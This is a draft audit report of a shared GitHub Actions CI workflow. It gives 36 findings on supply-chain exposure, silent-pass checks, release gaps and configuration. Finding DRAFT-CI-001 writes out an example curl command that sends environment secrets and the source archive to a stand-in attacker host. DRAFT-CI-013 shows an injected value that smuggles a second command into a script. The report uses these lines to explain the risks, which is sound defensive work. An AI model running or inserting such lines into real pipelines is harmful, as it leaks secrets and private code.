# ci-workflows: findings (code draft, 2026-11-05)

Prefix `DRAFT-CI`. Code at `main` = `c2cfff3`. Paths are relative to the repo root; `W` below
means `.github/workflows/react-native-ci.yml`. Severity scale from the brief:
**High** can leak secrets, ship untested code or let an outsider run code with secrets;
**Medium** a check that can silently pass, or a broken release path; **Low** quality, dead code,
question. Evidence from the six caller repos comes only from a read-only GitHub code search
(fragments of their `.github/workflows/ci.yml`), not from reading those repos; it is marked
"(caller search)". Nothing was changed, run or deployed.

---

## DRAFT-CI-001 — Six repos run this workflow from the moving `main` of a public, unprotected repo with no review, tags or self-test

- **Severity:** High
- **Category:** supply-chain / security
- **Evidence:**
  - All six callers use `dayly-buy/ci-workflows/.github/workflows/react-native-ci.yml@main`
    (caller search: `dayly-buy-market`, `magic-link-customer`, `daylybuy-admin`, `DaylyBuy`,
    `daylybuy-partner-app`, `magic-link-market`).
  - This repo's `main` is reported `"protected": false` (GitHub `list_branches`); the remote has
    no tags (`git ls-remote --tags` empty); no `CODEOWNERS`; `README.md:1` documents nothing.
  - No workflow in this repo checks its own workflow (`git ls-files` = 2 files).
  - Every commit in history went straight to `main` (`git log`), including `2d6bec5`, which
    broke shell syntax in `W` (missing `fi`) and so broke CI for every caller until `782c736`.
  - What a change on `main` reaches in each caller run: the caller's checked-out source (most are
    presumably private; unverified), the caller's `GITHUB_TOKEN` with `contents: read` +
    `pull-requests: read` (`W:57-59`, granted by every caller), and any secrets the caller passes:
    `dayly-buy-market` passes `SONAR_TOKEN` and `SNYK_TOKEN` (caller search). Secrets passed to
    a called workflow are available to it whether or not `run_sonar`/`run_snyk` is on.
- **What goes wrong:** anyone with write access to this repo — or anyone holding a stolen PAT,
  session or OAuth grant of such an account — pushes one commit to `main`, e.g. adding
  `curl -d @<(env; tar cz . | base64) https://attacker.example` to the "Install dependencies"
  step. On the next push to any branch of any of the six repos it runs with those repos' source,
  token and passed secrets. No review is required, nothing is pinned, and the change is visible
  only in this repo's history. The same path can silently weaken checks for all six repos at
  once (e.g. replace `npm test` at `W:154` with `true`), which every caller would read as green.
  A non-malicious bad push (as in `2d6bec5`) breaks all six repos' CI at once.
- **Suggested fix:** protect `main` (PR + review, no force-push), add `CODEOWNERS`, tag releases,
  and have callers pin `@<full-sha> # vX.Y.Z`, updated by Dependabot/Renovate; add a self-test
  workflow (actionlint + zizmor) here.
- **Needed for Play launch:** no — Play does not require it, but every repo's CI trust rests on
  it and the fix is cheap, so do it before launch.

## DRAFT-CI-002 — Defaults and missing scripts make a green run that checked nothing

- **Severity:** Medium
- **Category:** logic
- **Evidence:** `run_lint` and `run_tests` default to `false` (`W:21-31`); with both off the
  `quality` job is checkout + install only (`W:71-129`). When on but the script is missing, the
  step emits `::warning` and succeeds (`W:141-142`, `W:155-156`). The script check is only
  "truthy string" (`W:137`, `W:151`), so `"test": "jest --passWithNoTests"` or `"lint": "true"`
  also passes. `daylybuy-partner-app` CI comment: "`npm test` once it has tests (none yet: the
  run says so, as a warning)" (caller search) — so that repo is green today with zero tests.
- **What goes wrong:** a caller that forgets `run_tests: true`, renames `test` to `test:unit`, or
  deletes its tests gets a green check; a warning annotation does not block a merge or a required
  status check. A reviewer seeing "CI ✓" on a partner-app PR assumes tests passed.
- **Suggested fix:** make `run_tests` default `true` and add a `require_scripts` (default
  `true`) input that fails when an enabled script is missing; caller opts out explicitly.
- **Needed for Play launch:** yes — a green check must mean tests ran before builds from that
  commit go to users.

## DRAFT-CI-003 — Tests only ever run in UTC; Indian time is never exercised in CI

- **Severity:** Medium
- **Category:** logic
- **Evidence:** no `TZ` anywhere in `W`; no matrix; the test step is a bare `npm test`
  (`W:154`) on `ubuntu-latest` (`W:68`), whose default zone is UTC. Code search for `TZ` in the
  org's workflows returned 0 hits (caller search). The brief requires the Core's tests to pass in
  Indian time (`Asia/Kolkata`, UTC+05:30) **and** in `TZ=UTC`.
- **What goes wrong:** a date bug that appears only in IST — e.g. "today's" order cut-off or
  delivery slot computed with `new Date().getDate()`, which differs from UTC between 00:00 and
  05:30 IST — passes CI every time and is found by customers in India. Conversely, tests written
  on an IST laptop that assume IST pass locally and fail only in CI (or pass in CI because UTC
  happens to agree), so neither run alone proves both.
- **Suggested fix:** add a `test_timezones` input (default `["UTC","Asia/Kolkata"]`) and run the
  test step once per zone (`TZ=… npm test`), or a matrix on `quality`.
- **Needed for Play launch:** yes — the business runs in IST; time-dependent order logic must be
  proven in IST before customers rely on it.

## DRAFT-CI-004 — No release path: only a debug APK, never a signed AAB, never uploaded to Play

- **Severity:** Medium
- **Category:** release
- **Evidence:** the only build is `./gradlew assembleDebug` (`W:350-352`), uploaded as
  `app-debug-apk` (`W:354-358`). No `bundleRelease`, no signing config or keystore input, no
  `versionCode`/`versionName` handling, no Play upload, no EAS step. The job is off in every
  caller; caller comments: "Off until Play builds move to EAS (AUD-084, DEC-020). Nothing ships
  from this job … Release APKs are built on the owner's machine" (caller search).
- **What goes wrong:** Play requires an Android App Bundle (AAB) signed with the upload key for
  new apps, with a strictly increasing `versionCode`; a debug-signed, debuggable APK is rejected.
  The only real release path is a laptop build: not reproducible, not gated on tests, the upload
  key lives on one machine, and no record ties a Play release to a commit or a CI run.
- **Suggested fix:** decide the path (EAS Build + EAS Submit, or a `release-android` reusable
  workflow producing a signed AAB from secrets and uploading to an internal track), gated on
  `quality`.
- **Needed for Play launch:** yes — something reproducible must produce the signed AAB that Play
  accepts; today nothing in CI does.

## DRAFT-CI-005 — `android-build` has no way to receive build-time files or env, so it cannot pass for the apps that need them

- **Severity:** Medium
- **Category:** release / config
- **Evidence:** the job's only inputs are `node_version` and the on/off flag (`W:275-358`); no
  `secrets:` are read in it; `npx expo prebuild` runs with no env (`W:322-326`). Caller comments
  for `DaylyBuy` and `daylybuy-partner-app`: "it cannot pass here: prebuild needs
  google-services.json, which is not in the repo" (caller search). The job also ignores
  `working_directory` (`W:282-352`).
- **What goes wrong:** turning on `run_android_build: true` in those repos fails at prebuild every
  time, so the Android build is never checked in CI; a change that breaks the native build is
  found only on the owner's machine at release time.
- **Suggested fix:** add optional secrets (e.g. `GOOGLE_SERVICES_JSON_B64`) and an `env`/
  `expo_env` contract, written to disk in a step before prebuild, never echoed.
- **Needed for Play launch:** yes — unless EAS replaces this job, the native build must be
  buildable in CI before release.

## DRAFT-CI-006 — Third-party actions pinned by moving tags, one of them handed `SONAR_TOKEN` and `GITHUB_TOKEN`

- **Severity:** Medium
- **Category:** supply-chain
- **Evidence:** `SonarSource/sonarqube-scan-action@v6` (`W:225`) with `SONAR_TOKEN` and
  `GITHUB_TOKEN` in env (`W:226-228`); `android-actions/setup-android@v3` (`W:340`);
  `gradle/actions/setup-gradle@v4` (`W:345`). Commit `b940b58` pinned only the Snyk action for
  exactly this reason (comment `W:251-253`) but left these. zizmor `unpinned-uses` flags all of
  them (coverage.md).
- **What goes wrong:** if the publisher's tag `v6`/`v3`/`v4` is moved to a malicious commit (as in
  the 2025 `tj-actions/changed-files` incident), the next run executes it: in `sonar` it reads
  `SONAR_TOKEN` and the caller's token; in `android-build` it can read the private source, the
  persisted `GITHUB_TOKEN` (DRAFT-CI-014), and tamper with the uploaded APK. Both jobs are off in
  every caller today, so exposure is latent until someone turns them on.
- **Suggested fix:** pin each to a full commit SHA with a `# vX.Y.Z` comment and let Dependabot
  (`package-ecosystem: github-actions`) bump them.
- **Needed for Play launch:** no — the affected jobs are off; fix before enabling them.

## DRAFT-CI-007 — Sonar job passes even when the quality gate fails, scans the wrong directory, and has no coverage

- **Severity:** Medium
- **Category:** logic
- **Evidence:** `W:224-228` passes no `args`; there is no `-Dsonar.qualitygate.wait=true` and no
  separate quality-gate step, so the job's result is "analysis uploaded", not "gate passed"
  (based on the scan action's documented behaviour; unverified by running). No `projectBaseDir`,
  so it scans the repo root even when the caller set `working_directory: functions`. Tests ran
  in `quality` and saved no coverage, so Sonar has none. No `SONAR_HOST_URL` or org/project key is
  passed, so it depends on an unseen `sonar-project.properties` (unverified).
- **What goes wrong:** once enabled, a PR that drops coverage or adds a blocker issue gets a green
  `sonar` job; the result is visible only on the Sonar dashboard. For backends the analysis covers
  the root scripts plus `functions/` together, without coverage.
- **Suggested fix:** add `args: -Dsonar.qualitygate.wait=true` and `projectBaseDir:
  ${{ inputs.working_directory }}`, and pass an lcov artifact from `quality`.
- **Needed for Play launch:** no — Sonar is off in every caller (DEC-006 per caller comments).

## DRAFT-CI-008 — Question: nothing here gates deploys; callers appear to deploy independently of this CI

- **Severity:** Medium
- **Category:** release
- **Evidence:** the workflow has no deploy and no `workflow_call` outputs (`W:3-55`); a skipped
  job counts as success. Caller comment in `daylybuy-admin`: "Deploying stays as it was: by hand,
  or by firebase-hosting-merge.yml on main" (caller search). Whether that workflow (or any backend
  deploy) waits for this CI is unverified from here.
- **What goes wrong:** a commit merged to `main` with failing tests can still be deployed by the
  hosting workflow or by hand, because the deploy does not depend on this workflow's result — the
  "ship untested code" case. Settle by reading the callers' deploy workflows (other sessions).
- **Suggested fix:** in each caller, make the deploy job `needs:` the job that calls this workflow
  (same workflow file), or require the CI check in branch protection before merge.
- **Needed for Play launch:** yes — the backends and admin panel that the app talks to must not
  receive untested code at launch.

## DRAFT-CI-009 — pnpm (and Yarn 2+) repos break or use the wrong Yarn: Corepack is enabled after setup-node

- **Severity:** Low
- **Category:** logic
- **Evidence:** setup-node with `cache: <manager>` runs at `W:103-108` (and `W:300-304`);
  `corepack enable` only at `W:110-112` (`W:306-308`). setup-node's pnpm cache needs the `pnpm`
  binary already on `PATH`; its yarn cache calls `yarn` to locate the cache folder, which before
  Corepack is the runner's global Yarn 1.
- **What goes wrong:** a caller with `pnpm-lock.yaml` fails at "Setup Node.js" ("Unable to locate
  executable file: pnpm"); a Yarn Berry caller may cache the wrong folder (cache never hits). No
  current caller is known to use pnpm or Yarn (unverified).
- **Suggested fix:** move "Enable Corepack" before "Setup Node.js" (or use `pnpm/action-setup`).
- **Needed for Play launch:** no — no known caller uses these managers.

## DRAFT-CI-010 — The `npm install` fallback is dead code; a repo without a lockfile fails at setup-node, or caches against the wrong lockfile

- **Severity:** Low
- **Category:** logic / error
- **Evidence:** with no lockfile, detection writes `manager=npm`, `lockfile=` (`W:88-89`,
  `W:95-96`); setup-node is still asked to `cache: npm` (`W:107-108`). With an empty
  `cache-dependency-path`, setup-node searches the repository root and errors if it finds none.
  So `npm install` (`W:127`) is effectively unreachable. If `working_directory: functions` has no
  lockfile but the root has one, setup-node keys the cache on the **root** lockfile while
  installing `functions/` with `npm install` (unpinned versions).
- **What goes wrong:** a new caller without a lockfile gets a confusing setup-node error instead of
  the intended fallback; in the root-lockfile case, dependencies float and the cache key does not
  change when `functions/` dependencies do.
- **Suggested fix:** set `cache:` to empty when no lockfile is found, or fail early with a clear
  "lockfile required" error and drop the `npm install` branch.
- **Needed for Play launch:** no.

## DRAFT-CI-011 — `cancel-in-progress` cancels CI on `main`; a merged commit can end with no result

- **Severity:** Low
- **Category:** logic / config
- **Evidence:** `W:61-63`, group `${{ github.workflow }}-${{ github.ref }}`, `cancel-in-progress:
  true`, with no exception for the default branch. In a called workflow `github.workflow` is the
  caller's name (`CI` in all callers, caller search).
- **What goes wrong:** two merges to `main` a minute apart: the first commit's run is cancelled, so
  that commit shows "cancelled", not pass/fail. Anything that keys off a specific commit's CI
  result (a deploy, a release tag, a bisect) has no answer for it. If a caller ever adds its own
  workflow-level concurrency with the same group, GitHub can cancel the caller and callee against
  each other (unverified; no caller has `concurrency` per search).
- **Suggested fix:** `cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}`, and include
  `github.event_name` in the group.
- **Needed for Play launch:** no.

## DRAFT-CI-012 — Firestore emulator cache key never changes, so it is never refreshed

- **Severity:** Low
- **Category:** config
- **Evidence:** `key: firebase-emulators-${{ runner.os }}` (`W:190`), no version, no hash, no
  `restore-keys`. `actions/cache` does not overwrite an existing key.
- **What goes wrong:** the first run's emulator jar is cached forever. After a `firebase-tools`
  upgrade, every run restores the old jar, downloads the new one (~60 MB per the comment at
  `W:183-184`), and never saves it, so the cache stops saving time and grows stale. Rules tests
  still run against the version the installed `firebase-tools` asks for, so results are not wrong.
- **Suggested fix:** key on the lockfile hash, e.g. `firebase-emulators-${{ runner.os }}-${{
  hashFiles(format('{0}/package-lock.json', inputs.working_directory)) }}`.
- **Needed for Play launch:** no.

## DRAFT-CI-013 — `inputs.working_directory` is pasted into script text (template injection pattern)

- **Severity:** Low
- **Category:** security
- **Evidence:** `W:93` (`wd="${{ inputs.working_directory }}"`), `W:142`, `W:156`, `W:272`
  (inside `echo` workflow commands). zizmor `template-injection`, high confidence, at all four.
  `steps.pm.outputs.manager` is also interpolated (`W:119,121,314,316`) but can only be
  `npm`/`yarn`/`pnpm` (zizmor: low confidence).
- **What goes wrong:** the value comes from the caller's workflow file, so whoever sets it can
  already run code; there is no outside-attacker path today. But a value like
  `functions"; curl … #` would execute, and a value containing `%0A::` could forge workflow
  commands in the annotation. If a caller ever forwards a `workflow_dispatch` input or a branch
  name into `working_directory`, it becomes a real injection.
- **Suggested fix:** pass it through `env: WD: ${{ inputs.working_directory }}` and use `"$WD"`.
- **Needed for Play launch:** no.

## DRAFT-CI-014 — Every checkout leaves the `GITHUB_TOKEN` in `.git/config` for dependency scripts to read

- **Severity:** Low
- **Category:** security
- **Evidence:** four `actions/checkout@v4` steps with default `persist-credentials: true`
  (`W:71-72`, `W:219-222`, `W:247-248`, `W:282-283`); then third-party code runs: `npm ci`
  lifecycle scripts (`W:114-129`, `W:310-320`), tests, Expo prebuild, Gradle plugins. zizmor
  `artipacked` (low confidence; no directory artifact is uploaded, only the APK).
- **What goes wrong:** a compromised npm dependency's `postinstall` reads the token from
  `.git/config` and, during the job, clones the caller's private repo or reads its PRs. Scope is
  read-only (`W:57-59`) and the token expires at job end, so the extra exposure over "the code is
  already on disk" is small, mainly for PR metadata.
- **Suggested fix:** `with: persist-credentials: false` on all four checkouts (nothing here
  pushes).
- **Needed for Play launch:** no.

## DRAFT-CI-015 — GitHub-owned actions pinned by major tag only

- **Severity:** Low
- **Category:** supply-chain
- **Evidence:** `actions/checkout@v4` (`W:72,220,248,283`), `actions/setup-node@v4`
  (`W:104,301`), `actions/setup-java@v4` (`W:175,329`), `actions/cache@v4` (`W:187`),
  `actions/upload-artifact@v4` (`W:355`). zizmor `unpinned-uses` with the blanket policy.
- **What goes wrong:** the run uses whatever `v4` points to that day; a behaviour change (or a
  compromise of the `actions` org, unlikely) changes all six repos' CI with no diff here.
- **Suggested fix:** pin to SHAs with `# v4.x.y` comments and let Dependabot bump them.
- **Needed for Play launch:** no.

## DRAFT-CI-016 — Question: does the Sonar scan need `GITHUB_TOKEN` at all?

- **Severity:** Low
- **Category:** security
- **Evidence:** `GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}` in the Sonar step's env (`W:228`).
  History shows it toggled between `secrets.GITHUB_TOKEN` and `github.token` (`782c736`,
  `a32791e`), suggesting copy-paste rather than need.
- **What goes wrong:** a third-party, tag-pinned action (DRAFT-CI-006) gets a token it may not use.
  PR decoration on SonarCloud is done by Sonar's GitHub App, not by this token (unverified for
  self-hosted SonarQube).
- **Suggested fix:** remove it unless the Sonar docs for the chosen edition require it. Settle by
  checking `sonarqube-scan-action` v6 docs.
- **Needed for Play launch:** no.

## DRAFT-CI-017 — Question: `pull-requests: read` is requested but nothing visibly uses it, and it forces every caller to grant it

- **Severity:** Low
- **Category:** security / config
- **Evidence:** `W:59`. No step calls the PR API. A called workflow's permissions must be a subset
  of the caller's, so a caller granting only `contents: read` would fail to start. zizmor
  `undocumented-permissions` (auditor persona).
- **What goes wrong:** minor over-grant; and a confusing start-up failure for a new caller who
  follows least privilege.
- **Suggested fix:** drop it, or document why (e.g. Sonar PR decoration) in a comment.
- **Needed for Play launch:** no.

## DRAFT-CI-018 — Default Node version is 20, which reached end of life in April 2026

- **Severity:** Low
- **Category:** config
- **Evidence:** `default: "20"` (`W:10`); four callers pass `"20"` explicitly (caller search: the
  three Expo apps and the admin panel), the two backends pass `"22"`.
- **What goes wrong:** CI tests on a runtime that gets no security fixes; Expo/RN tooling and
  setup-node may drop it; local dev and CI drift.
- **Suggested fix:** default `"22"` (or `"24"`), and read `engines.node`/`.nvmrc` when present.
- **Needed for Play launch:** no.

## DRAFT-CI-019 — Question: the `@v4` actions run on the Node 20 Actions runtime that GitHub is retiring

- **Severity:** Low
- **Category:** config
- **Evidence:** `actions/checkout@v4`, `setup-node@v4`, `setup-java@v4`, `cache@v4`,
  `upload-artifact@v4` (`W:72,104,175,187,355`) are node20-runtime actions; their next majors
  moved to node24. GitHub announced forcing node24 for JavaScript actions during 2026
  (exact date unverified).
- **What goes wrong:** warnings now; later, failures or forced behaviour changes across all six
  repos at once.
- **Suggested fix:** upgrade to the current majors when pinning (DRAFT-CI-015).
- **Needed for Play launch:** no.

## DRAFT-CI-020 — `android-build` ignores `working_directory` and has no lockfile fallback, unlike `quality`

- **Severity:** Low
- **Category:** logic
- **Evidence:** no `working-directory` on any step in `W:282-352`; detection writes no lockfile
  path (`W:285-298`); install is `npm ci` unconditionally (`W:319`) vs `npm install` fallback in
  `quality` (`W:124-128`). Commit `95657f7` says the root is intentional for Expo apps.
- **What goes wrong:** an app kept in a subfolder (monorepo) cannot use the job; and the two jobs
  disagree on what a repo without a lockfile does (setup-node fails in both anyway, DRAFT-CI-010).
- **Suggested fix:** honour `working_directory` (or a separate `app_directory` input) in this job.
- **Needed for Play launch:** no.

## DRAFT-CI-021 — Detection and install logic duplicated between `quality` and `android-build`

- **Severity:** Low
- **Category:** config
- **Evidence:** `W:74-129` vs `W:285-320`; the copies already differ (lockfile output, fallback,
  working directory).
- **What goes wrong:** a fix to one copy is missed in the other (as happened with the lockfile
  path in `95657f7`).
- **Suggested fix:** move detection + setup + install into a local composite action used by both.
- **Needed for Play launch:** no.

## DRAFT-CI-022 — APK upload: missing file only warns; no retention limit for a debuggable APK

- **Severity:** Low
- **Category:** release / security
- **Evidence:** `actions/upload-artifact@v4` with `name`/`path` only (`W:354-358`): default
  `if-no-files-found: warn`, retention = repo/org default (90 days unless changed).
- **What goes wrong:** a flavour or ABI split moves the APK (e.g. `apk/<flavor>/debug/`), the job
  passes with no artifact. A debuggable APK, with the bundled JS and any `EXPO_PUBLIC_*` values,
  stays downloadable by every repo reader for 90 days.
- **Suggested fix:** `if-no-files-found: error`, `retention-days: 7`.
- **Needed for Play launch:** no.

## DRAFT-CI-023 — Lint, test and rules scripts always run through `npm`, whatever the package manager

- **Severity:** Low
- **Category:** logic
- **Evidence:** `npm run lint` (`W:140`), `npm test` (`W:154`), `npm run test:rules` (`W:196`)
  after a yarn/pnpm install (`W:119-122`).
- **What goes wrong:** usually works, but `pre`/`post` script hooks, Yarn PnP (no `node_modules`)
  and pnpm-specific settings behave differently under npm; a Yarn PnP repo's tests fail or a pnpm
  `pretest` runs differently from local.
- **Suggested fix:** run scripts with the detected manager (`$PM run lint`).
- **Needed for Play launch:** no.

## DRAFT-CI-024 — Backends: the root `package.json` is never installed, linted, tested or scanned

- **Severity:** Low
- **Category:** logic / supply-chain
- **Evidence:** single `working_directory` (`W:12-19`); both backends pass `functions`, and their
  comments say the root holds "the two scripting deps" / "firebase-admin" (caller search). Snyk
  scans only the first lockfile in that one directory (`W:266-271`).
- **What goes wrong:** root-level scripts (presumably admin/migration scripts run with real
  credentials; unverified) could carry a vulnerable or broken dependency that no check ever sees.
- **Suggested fix:** allow a list of directories, or `snyk test --all-projects` plus a root install
  check.
- **Needed for Play launch:** no.

## DRAFT-CI-025 — Fork pull requests fail outright if Sonar or Snyk is turned on

- **Severity:** Low
- **Category:** logic
- **Evidence:** callers trigger on `pull_request` (caller search); fork PRs receive no secrets, so
  the "missing" checks exit 1 (`W:214-217`, `W:242-245`).
- **What goes wrong:** an outside contributor's PR always shows red for a reason unrelated to the
  change. (Correctly, the token is not exposed: callers use `pull_request`, not
  `pull_request_target` — no caller has `pull_request_target`, caller search.)
- **Suggested fix:** skip those jobs when
  `github.event.pull_request.head.repo.fork == true`, with a notice.
- **Needed for Play launch:** no.

## DRAFT-CI-026 — Snyk and Sonar run only after `quality` passes

- **Severity:** Low
- **Category:** logic
- **Evidence:** `needs: [quality]` on both (`W:202`, `W:233`).
- **What goes wrong:** when a test fails, the vulnerability scan is skipped, so a PR that both
  breaks a test and adds a vulnerable package shows only the test failure; the vulnerability
  appears after the test is fixed. Sonar likewise.
- **Suggested fix:** drop `needs:` for the scan jobs (they do not use `quality`'s outputs).
- **Needed for Play launch:** no.

## DRAFT-CI-027 — `README.md` documents nothing; no `CODEOWNERS`, no `LICENSE` in a public repo

- **Severity:** Low
- **Category:** config
- **Evidence:** `README.md:1` is the only line. No contract, no versioning, no "callers must grant
  `pull-requests: read`" note. No `CODEOWNERS` or `LICENSE` in `git ls-files`.
- **What goes wrong:** callers learn the contract from the YAML (and two backends learned about
  `working_directory` the hard way, per their comments); without a licence, the public code is
  not legally reusable by others (minor).
- **Suggested fix:** README with inputs/secrets/permissions table and a pinning policy; add
  `CODEOWNERS`.
- **Needed for Play launch:** no.

## DRAFT-CI-028 — The public repo discloses internal audit IDs, run IDs and author email addresses

- **Severity:** Low
- **Category:** security
- **Evidence:** comments cite `AUD-067`, `AUD-084`, `DEC-020` and "dayly-buy-market run
  38270631525" (`W:206-208`, `W:251-253`, `W:334-338`); commit messages name internal decisions;
  git history carries two personal Gmail author addresses (`git log --format=%ae`).
- **What goes wrong:** anyone can map the org's private repo names, audit trail and maintainers'
  personal addresses — useful reconnaissance for the phishing route to DRAFT-CI-001.
- **Suggested fix:** keep internal references in the private master book; use GitHub
  `noreply` addresses for commits.
- **Needed for Play launch:** no.

## DRAFT-CI-029 — Question: is 20 minutes enough for install + tests + emulator on a cold cache?

- **Severity:** Low
- **Category:** config
- **Evidence:** `quality` `timeout-minutes: 20` (`W:69`) covers install, lint, tests (the Core
  has 559 tests per its caller comment) and, for rules tests, a JDK install plus a ~60 MB
  emulator download (`W:173-196`).
- **What goes wrong:** a slow cold run times out and shows as "cancelled"/failed for no code
  reason. Settle with run durations from the callers' Actions history.
- **Suggested fix:** check real durations; raise or split the rules tests into their own job.
- **Needed for Play launch:** no.

## DRAFT-CI-030 — Floating runner image `ubuntu-latest`

- **Severity:** Low
- **Category:** config
- **Evidence:** `W:68`, `W:201`, `W:232`, `W:277`.
- **What goes wrong:** GitHub moves `ubuntu-latest` to a new Ubuntu release; preinstalled tools
  (Android SDK, Java, Yarn 1) change underneath all six repos with no diff here.
- **Suggested fix:** pin `ubuntu-24.04` and bump deliberately.
- **Needed for Play launch:** no.

## DRAFT-CI-031 — The pinned Snyk action installs whatever Snyk CLI is "latest" at run time

- **Severity:** Low
- **Category:** supply-chain
- **Evidence:** `W:254-255` passes no `with:`; at the pinned commit, `setup/action.yml` defaults
  `snyk-version: latest` and `setup/setup_snyk.sh` downloads the binary and its `.sha256` from the
  same host (`downloads.snyk.io`, fallback `static.snyk.io`). The job then runs it with
  `SNYK_TOKEN` (`W:261-262`).
- **What goes wrong:** the SHA pin fixes the installer, not the binary that holds the token; a bad
  CLI release changes results or behaviour with no diff, and the checksum does not defend against
  a compromise of the download host (same origin). Snyk is the vendor being trusted anyway, so the
  risk is low; the job is off.
- **Suggested fix:** `with: snyk-version: v1.x.y` (exact).
- **Needed for Play launch:** no.

## DRAFT-CI-032 — Question: Yarn `--frozen-lockfile` on Yarn 2+

- **Severity:** Low
- **Category:** logic
- **Evidence:** `yarn install --frozen-lockfile` (`W:120`, `W:315`).
- **What goes wrong:** on Yarn Berry the flag is deprecated in favour of `--immutable`; depending
  on version it may only warn, so a lockfile mismatch might not fail CI (unverified; no caller is
  known to use Yarn).
- **Suggested fix:** use `--immutable` when `packageManager` says Yarn ≥ 2.
- **Needed for Play launch:** no.

## DRAFT-CI-033 — Question: firebase-tools and the emulator version come entirely from each caller

- **Severity:** Low
- **Category:** config
- **Evidence:** `W:192-196` runs `npm run test:rules`; the workflow installs no `firebase-tools`
  and pins no emulator version.
- **What goes wrong:** if a caller's `test:rules` uses `npx firebase …` without `firebase-tools`
  in its lockfile, npx fetches the latest from the registry at run time (unpinned code). Settle by
  reading the Core's `functions/package.json` (other session).
- **Suggested fix:** document that `firebase-tools` must be a devDependency of the caller.
- **Needed for Play launch:** no.

## DRAFT-CI-034 — `npx expo prebuild` can fetch an unpinned `expo` package

- **Severity:** Low
- **Category:** supply-chain
- **Evidence:** `W:326`.
- **What goes wrong:** if `expo` is not resolvable from the local `node_modules` (wrong directory,
  failed install), npx downloads the latest `expo` from the registry instead of failing. In
  practice every Expo app has it as a dependency, so this is unlikely.
- **Suggested fix:** `npx --no-install expo prebuild …`.
- **Needed for Play launch:** no.

## DRAFT-CI-035 — No `workflow_call` outputs, step summary or test/coverage artifact

- **Severity:** Low
- **Category:** config
- **Evidence:** no `outputs:` under `on.workflow_call` (`W:4-55`); no `$GITHUB_STEP_SUMMARY`
  writes; the only artifact is the APK (`W:354-358`).
- **What goes wrong:** a caller cannot chain a deploy on "tests actually ran" vs "warned and
  skipped" (DRAFT-CI-002), and test failures are read from raw logs only.
- **Suggested fix:** expose `tests_ran`/`lint_ran` outputs and write a short summary.
- **Needed for Play launch:** no.

## DRAFT-CI-036 — Push to `**` plus `pull_request` runs every PR twice

- **Severity:** Low
- **Category:** config
- **Evidence:** callers trigger on `push: branches: ["**"]` and `pull_request: branches: [main]`
  (caller search); the concurrency group includes `github.ref` (`W:62`), which differs between
  the two events, so neither cancels the other.
- **What goes wrong:** double Actions minutes for every PR push (installs, emulator, and — if
  enabled — a 45-minute Android build twice).
- **Suggested fix:** in callers, limit `push` to `main`, or skip push runs for branches with an
  open PR.
- **Needed for Play launch:** no.

---

## Summary table

| ID | Severity | Category | Launch | Title |
|---|---|---|---|---|
| DRAFT-CI-001 | High | supply-chain / security | no | Six repos run this workflow from the moving `main` of a public, unprotected repo |
| DRAFT-CI-002 | Medium | logic | yes | Defaults and missing scripts make a green run that checked nothing |
| DRAFT-CI-003 | Medium | logic | yes | Tests only ever run in UTC; Indian time never exercised |
| DRAFT-CI-004 | Medium | release | yes | No release path: debug APK only, no signed AAB, no Play upload |
| DRAFT-CI-005 | Medium | release / config | yes | `android-build` cannot receive build-time files or env |
| DRAFT-CI-006 | Medium | supply-chain | no | Third-party actions tag-pinned, one holding `SONAR_TOKEN` |
| DRAFT-CI-007 | Medium | logic | no | Sonar passes despite failed gate, wrong directory, no coverage |
| DRAFT-CI-008 | Medium | release | yes | Question: nothing gates deploys on this CI |
| DRAFT-CI-009 | Low | logic | no | Corepack enabled after setup-node: pnpm/Yarn 2+ break |
| DRAFT-CI-010 | Low | logic / error | no | `npm install` fallback dead; no-lockfile repos fail or mis-cache |
| DRAFT-CI-011 | Low | logic / config | no | `cancel-in-progress` cancels CI on `main` |
| DRAFT-CI-012 | Low | config | no | Emulator cache key never changes |
| DRAFT-CI-013 | Low | security | no | `working_directory` interpolated into scripts |
| DRAFT-CI-014 | Low | security | no | Checkout persists `GITHUB_TOKEN` for dependency scripts |
| DRAFT-CI-015 | Low | supply-chain | no | GitHub-owned actions pinned by tag only |
| DRAFT-CI-016 | Low | security | no | Question: Sonar step given `GITHUB_TOKEN` |
| DRAFT-CI-017 | Low | security / config | no | Question: `pull-requests: read` unused, forced on callers |
| DRAFT-CI-018 | Low | config | no | Default Node 20 is end-of-life |
| DRAFT-CI-019 | Low | config | no | Question: `@v4` actions on retiring node20 runtime |
| DRAFT-CI-020 | Low | logic | no | `android-build` ignores `working_directory`, no fallback |
| DRAFT-CI-021 | Low | config | no | Detection/install logic duplicated |
| DRAFT-CI-022 | Low | release / security | no | APK upload only warns if missing; 90-day retention |
| DRAFT-CI-023 | Low | logic | no | Scripts always run via `npm` |
| DRAFT-CI-024 | Low | logic / supply-chain | no | Backend root `package.json` never checked |
| DRAFT-CI-025 | Low | logic | no | Fork PRs fail if Sonar/Snyk on |
| DRAFT-CI-026 | Low | logic | no | Scans skipped when tests fail |
| DRAFT-CI-027 | Low | config | no | README empty; no CODEOWNERS/LICENSE |
| DRAFT-CI-028 | Low | security | no | Public repo discloses internal IDs and author emails |
| DRAFT-CI-029 | Low | config | no | Question: 20-minute `quality` timeout |
| DRAFT-CI-030 | Low | config | no | Floating `ubuntu-latest` |
| DRAFT-CI-031 | Low | supply-chain | no | Snyk CLI installed at `latest` |
| DRAFT-CI-032 | Low | logic | no | Question: Yarn `--frozen-lockfile` on Yarn 2+ |
| DRAFT-CI-033 | Low | config | no | Question: firebase-tools/emulator version from callers |
| DRAFT-CI-034 | Low | supply-chain | no | `npx expo` can fetch unpinned package |
| DRAFT-CI-035 | Low | config | no | No outputs, summary or test artifact |
| DRAFT-CI-036 | Low | config | no | Push `**` + `pull_request` runs every PR twice |

**Counts:** High 1, Medium 7, Low 28 — total 36.
